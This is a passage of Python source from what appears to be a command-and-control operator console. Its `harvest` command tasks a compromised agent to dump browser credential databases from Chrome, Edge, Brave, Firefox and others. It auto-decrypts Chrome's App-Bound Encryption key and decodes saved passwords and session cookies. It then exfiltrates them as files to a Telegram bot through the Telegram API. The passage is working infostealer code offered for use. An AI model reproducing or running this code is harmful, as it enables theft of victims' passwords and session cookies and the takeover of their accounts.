                        console.print(f"[green]  ABE key decrypted: {key_hex[:16]}... ({len(key_bytes)} bytes)[/green]")
                        return key_bytes
                    else:
                        console.print(f"[red]  ABE BOF completed but no key in output[/red]")
                        if text:
                            for line in text.splitlines()[-5:]:
                                console.print(f"[dim]    {line}[/dim]")
                        return None

        console.print("[red]  ABE BOF timed out[/red]")
        return None

    # ─── Harvest (cookie-monster decode + Telegram) ─────────────────

    def _cmd_harvest(self, args, line):
        """Run cookie-monster, decode passwords/cookies, send via Telegram."""
        decode_only = "--decode" in args
        abe_key_file = None
        abe_key_hex = None
        filtered_args = []
        i = 0
        while i < len(args):
            if args[i] == "--decode":
                i += 1
                continue
            if args[i] == "--abe-key" and i + 1 < len(args):
                abe_key_file = args[i + 1]
                i += 2
                continue
            if args[i] == "--abe-key-hex" and i + 1 < len(args):
                abe_key_hex = args[i + 1]
                i += 2
                continue
            filtered_args.append(args[i])
            i += 1
        browser = filtered_args[0] if filtered_args else "all"
        valid = ["chrome", "msedge", "coccoc", "brave", "avast", "firefox", "all"]
        if browser not in valid:
            console.print("[yellow]Usage: harvest [browser|all] [--decode] [--abe-key <file>] [--abe-key-hex <hex>][/yellow]")
            console.print("[dim]  --decode              Skip BOF, decode existing downloads[/dim]")
            console.print("[dim]  --abe-key <file>      Load decrypted ABE key from file (32 raw bytes or hex)[/dim]")
            console.print("[dim]  --abe-key-hex <hex>   Pass decrypted ABE key as 64-char hex string[/dim]")
            return

        agent_id = self.current_agent_id
        agent = self.client.agents.get(agent_id)
        agent_label = f"{agent.username}@{agent.computer}" if agent else agent_id[:8]

        if decode_only:
            # Find most recent completed cookie-monster task for this agent
            console.print("[cyan]Decode-only mode: using existing task output[/cyan]")
            tasks = self.client.task_list(agent_id)
            task_info = None
            for t in tasks:
                cl = t.get("a_cmdline", "")
                if cl.startswith("cookie-monster") and t.get("a_completed"):
                    task_info = t
                    break
            if not task_info:
                console.print("[red]No completed cookie-monster task found for this agent[/red]")
                return
        else:
            # Step 1: Run cookie-monster
            cmd = f"cookie-monster -b {browser}"
            console.print(f"[cyan]Running: {cmd}[/cyan]")
            try:
                self.client.agent_command_raw(agent_id, cmd)
            except Exception as e:
                console.print(f"[red]Failed to send command: {e}[/red]")
                return

            # Step 2: Wait for task completion by polling
            console.print("[dim]Waiting for cookie-monster to complete...[/dim]")
            task_id = None
            for _ in range(120):
                time.sleep(2)
                try:
                    tasks = self.client.task_list(agent_id)
                except Exception:
                    continue
                for t in tasks:
                    if t.get("a_cmdline", "") == cmd and t.get("a_completed"):
                        task_id = t["a_task_id"]
                        break
                if task_id:
                    break
            else:
                console.print("[red]Timeout waiting for cookie-monster (4 min)[/red]")
                return

            task_info = None
            for t in tasks:
                if t["a_task_id"] == task_id:
                    task_info = t
                    break
            if not task_info:
                console.print("[red]Task output not found[/red]")
                return

        bof_output = task_info.get("a_text", "")
        browser_keys = parse_master_keys(bof_output)
        has_keys = [b for b, k in browser_keys.items() if k.master_key]
        if not has_keys:
            console.print("[red]No master keys found in BOF output[/red]")
            console.print(f"[dim]Output:\n{bof_output[:500]}[/dim]")
            return

        if abe_key_hex:
            try:
                abe_key = bytes.fromhex(abe_key_hex.strip())
                for bk in browser_keys.values():
                    if bk.master_key:
                        bk.abe_key = abe_key
                console.print(f"[green]  ABE key loaded from hex ({len(abe_key)} bytes)[/green]")
            except Exception as e:
                console.print(f"[yellow]  Warning: invalid ABE key hex: {e}[/yellow]")
        elif abe_key_file:
            try:
                abe_key_file = os.path.expanduser(abe_key_file)
                with open(abe_key_file, "rb") as f:
                    raw = f.read()
                if len(raw) == 32:
                    abe_key = raw
                elif len(raw) == 64:
                    abe_key = bytes.fromhex(raw.decode("ascii").strip())
                else:
                    abe_key = bytes.fromhex(raw.decode("ascii").strip())
                for bk in browser_keys.values():
                    if bk.master_key:
                        bk.abe_key = abe_key
                console.print(f"[green]  ABE key loaded from {abe_key_file} ({len(abe_key)} bytes)[/green]")
            except Exception as e:
                console.print(f"[yellow]  Warning: could not load ABE key: {e}[/yellow]")

        # Auto-decrypt ABE key if needed and no manual key provided
        needs_abe = any(bk.master_key and not bk.abe_key for bk in browser_keys.values())
        if needs_abe and not abe_key_hex and not abe_key_file:
            console.print("[cyan]  ABE key missing — attempting auto-decrypt via BOF...[/cyan]")
            enc_key = self._find_encrypted_abe_key(agent_id, "chrome")
            if enc_key:
                abe_key = self._run_abe_bof(agent_id, enc_key)
                if abe_key:
                    for bk in browser_keys.values():
                        if bk.master_key and not bk.abe_key:
                            bk.abe_key = abe_key
            else:
                console.print("[yellow]  No encrypted ABE key found in Local State downloads[/yellow]")
                console.print("[dim]  v20-encrypted data will be skipped. Use --abe-key-hex to provide manually.[/dim]")

        for bname, bk in browser_keys.items():
            key_info = []
            if bk.master_key:
                key_info.append("master")
            if bk.abe_key:
                key_info.append("ABE")
            console.print(f"[green]  {bname}: {', '.join(key_info)} key(s)[/green]")

        # Step 4: Wait a bit for downloads to register, then find matching files
        time.sleep(3)
        all_passwords = []
        all_cookies_json = {}  # {browser: [cookie_dicts]}
        browsers_decoded = []
        total_pwd = 0
        total_cookie = 0

        for bname, bkeys in browser_keys.items():
            if not bkeys.master_key:
                continue
            prefix = BROWSER_FILE_PREFIX.get(bname)
            if not prefix:
                continue

            pwd_file_id = None
            cookie_file_id = None
            for dl in self.client.downloads.values():
                if dl.agent_id != agent_id:
                    continue
                if dl.filename == f"{prefix}Passwords.db" and dl.state == 3:
                    pwd_file_id = dl.file_id
                if dl.filename == f"{prefix}Cookies.db" and dl.state == 3:
                    cookie_file_id = dl.file_id

            # Decode passwords
            if pwd_file_id:
                try:
                    _, content = self.client.download_sync(pwd_file_id)
                    passwords, stats = decode_passwords(content, bkeys)
                    txt = format_passwords_txt(bname, passwords, stats)
                    if txt:
                        all_passwords.append(txt)
                    total_pwd += len(passwords)
                    msg = f"  {bname}: {len(passwords)} passwords (v10={stats.v10_ok} v20={stats.v20_ok})"
                    if stats.v20_fail:
                        msg += f" [yellow]({stats.v20_fail} v20 need ABE key)[/yellow]"
                    console.print(f"[green]{msg}[/green]")
                except Exception as e:
                    console.print(f"[red]  {bname} passwords: {e}[/red]")

            # Decode cookies
            if cookie_file_id:
                try:
                    _, content = self.client.download_sync(cookie_file_id)
                    cookies, stats = decode_cookies(content, bkeys)
                    json_list = format_cookies_json(bname, cookies, stats)
                    if json_list:
                        all_cookies_json[bname] = json_list
                    total_cookie += len(cookies)
                    msg = f"  {bname}: {len(cookies)} cookies (v10={stats.v10_ok} v20={stats.v20_ok})"
                    if stats.v20_fail:
                        msg += f" [yellow]({stats.v20_fail} v20 need ABE key)[/yellow]"
                    console.print(f"[green]{msg}[/green]")
                except Exception as e:
                    console.print(f"[red]  {bname} cookies: {e}[/red]")

            if pwd_file_id or cookie_file_id:
                browsers_decoded.append(bname)

        if not all_passwords and not all_cookies_json:
            console.print("[yellow]No data decoded — check downloads list[/yellow]")
            return

        import json as _json
        ts = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
        label = agent_label.replace('@', '_')
        caption = (
            f"🔑 Harvest: {agent_label}\n"
            f"Browsers: {', '.join(browsers_decoded)}\n"
            f"Passwords: {total_pwd} | Cookies: {total_cookie}"
        )

        # Send passwords as .txt
        if all_passwords:
            header = (
                f"Harvest Report — {agent_label}\n"
                f"Agent: {agent_id[:8]}\n"
                f"Date: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                f"{'=' * 60}\n\n"
            )
            pwd_report = header + "\n".join(all_passwords) + "\n"
            self._send_telegram_file(
                pwd_report.encode("utf-8"),
                f"passwords_{label}_{ts}.txt",
                caption,
            )

        # Send cookies as .json (Cookie-Editor format)
        if all_cookies_json:
            combined = []
            for bname, clist in all_cookies_json.items():
                combined.extend(clist)
            cookie_data = _json.dumps(combined, ensure_ascii=False, indent=2)
            self._send_telegram_file(
                cookie_data.encode("utf-8"),
                f"cookies_{label}_{ts}.json",
                f"🍪 Cookies: {agent_label}\n{total_cookie} cookies | {', '.join(all_cookies_json.keys())}",
                mime="application/json",
            )

    def _send_telegram_file(self, content: bytes, filename: str, caption: str, mime: str = "text/plain"):
        """Send a file to Telegram via bot API."""
        bot_token = (
            os.environ.get("WHISKA_TG_TOKEN", "")
            or os.environ.get("ETC2_TG_TOKEN", "")
            or cfg_get("tg_token", "WHISKA_TG_TOKEN")
        )
        chat_id = (
            os.environ.get("WHISKA_TG_CHAT", "")
            or os.environ.get("ETC2_TG_CHAT", "")
            or cfg_get("tg_chat", "WHISKA_TG_CHAT")
        )
        if not bot_token or not chat_id:
            console.print("[red]Telegram credentials not configured.[/red]")
            console.print("[dim]  config set tg_token <bot_token>[/dim]")
            console.print("[dim]  config set tg_chat  <chat_id>[/dim]")
            console.print("[dim]  (or export WHISKA_TG_TOKEN / WHISKA_TG_CHAT)[/dim]")
            return

        import io as _io
        try:
            resp = __import__("requests").post(
                f"https://api.telegram.org/bot{bot_token}/sendDocument",
                data={"chat_id": chat_id, "caption": caption, "parse_mode": "HTML"},
                files={"document": (filename, _io.BytesIO(content), mime)},
                timeout=30,
            )
            if resp.status_code == 200 and resp.json().get("ok"):
                console.print(f"[green]✓ Sent to Telegram: {filename}[/green]")
            else:
                console.print(f"[red]Telegram error: {resp.text[:200]}[/red]")
        except Exception as e:
            console.print(f"[red]Telegram send failed: {e}[/red]")

    def _do_exit(self):
        self._running = False
        console.print("[dim]Disconnecting...[/dim]")
